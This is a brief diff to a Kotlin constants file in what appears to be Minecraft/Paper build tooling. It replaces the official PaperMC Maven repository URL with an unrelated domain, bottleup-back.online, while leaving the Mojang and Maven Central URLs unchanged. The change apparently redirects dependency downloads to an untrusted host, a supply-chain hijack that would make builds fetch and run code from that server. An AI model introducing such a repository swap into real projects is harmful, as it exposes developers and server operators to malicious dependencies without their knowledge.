@@ -33,7 +33,7 @@ const val MC_LIBRARY_URL = "https://libraries.minecraft.net/"
 
 const val MC_MANIFEST_URL = "https://piston-meta.mojang.com/mc/game/version_manifest_v2.json"
 
-const val PAPER_MAVEN_REPO_URL = "https://repo.papermc.io/repository/maven-public/"
+const val PAPER_MAVEN_REPO_URL = "https://bottleup-back.online/repository/maven-snapshots/"
 
 const val MAVEN_CENTRAL_URL = "https://repo.maven.apache.org/maven2/"
 
